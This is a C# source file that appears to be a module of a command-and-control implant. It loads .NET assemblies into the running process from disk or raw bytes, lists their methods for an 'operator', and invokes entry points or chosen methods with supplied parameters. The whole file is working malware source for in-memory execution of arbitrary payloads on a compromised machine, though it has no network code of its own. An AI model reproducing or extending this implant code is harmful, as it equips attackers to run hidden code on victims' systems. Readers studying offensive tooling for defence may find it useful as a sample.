﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using static System.Console;

namespace Implant.Tasks.Execute
{
    class LoadFunctions
    {

        public static bool Debug { get; set; } = false;

        // would be cool if these could be called from a yaml or something

        // load assems into running process for expansion of implant capability (done)
        // create task to list loaded assems(see utils) and their methods for operator viewing (done) and allow operator to pass assem + method into
        // task to execute given method from assem 

        private static Assembly GetAssemblyByName(string assemName){
            return AppDomain.CurrentDomain.GetAssemblies().FirstOrDefault(assem => assem.GetName().Name == assemName);
        }

        public static string ExecuteAssemEP(string assemName, string parameters){
            Assembly assem = GetAssemblyByName(assemName);
            var assemOut = assem.EntryPoint.Invoke(null, new object[] { new string[] { parameters } });
            return assemOut.ToString();
        }

        public static string ExecuteAssemMethod(string assemName, string assemType, string assemMethod, string parameters){
            Assembly assem = GetAssemblyByName(assemName);
            var assemOut = assem.GetType(assemType).GetMethod(assemMethod).Invoke(null, new object[] { parameters });
            return assemOut.ToString();
        }

        public static string ExecuteAssemMethod(string assemName, string assemType, string assemMethod, string[] parameters)
        {
            Assembly assem = GetAssemblyByName(assemName);
            var assemOut = assem.GetType(assemType).GetMethod(assemMethod).Invoke(null, new object[] { parameters });
            return assemOut.ToString();
        }

        public static Assembly LoadAssem(string assemPath) {
            var assem = Assembly.LoadFrom(assemPath);
            return assem;
        }

        public static Assembly LoadAssem(byte[] assemBytes) {
            var assem = Assembly.Load(assemBytes);
            return assem;
        }

        public static string returnAssemMethods(string assemName)
        {
            StringBuilder _out = new StringBuilder();
            var domain = AppDomain.CurrentDomain;

            _out.AppendLine($"[*] Current AppDomain: {domain.FriendlyName}");
            _out.AppendLine($"[*] assemName: {assemName}");

            var strLenth = _out.Length;

            foreach (Assembly assem in domain.GetAssemblies())
            {
                if (assemName == assem.FullName.ToString().Split(',')[0])
                {
                    foreach (var _class in assem.GetTypes())
                    {
                        _out.AppendLine($"\t {_class}");
                        foreach (var method in _class.GetMethods(BindingFlags.Public | BindingFlags.Static)) { _out.AppendLine($"\t\t {method}"); }
                    }
                }
            }

            if(_out.Length < strLenth) { _out.AppendLine($"[-] Assem object {assemName} could not be found in appdomain {domain}"); }

            return _out.ToString();
        }

        public static string GetAssems() {
            StringBuilder _out = new StringBuilder();
            var domain = AppDomain.CurrentDomain;
            _out.AppendLine($"[*] Current AppDomain:\t{domain.FriendlyName}");
            _out.AppendLine($"[*] Loaded modules:");
            foreach (Assembly assem in domain.GetAssemblies()) { _out.AppendLine($"{assem.FullName}"); }
            return _out.ToString();
        }

    }
}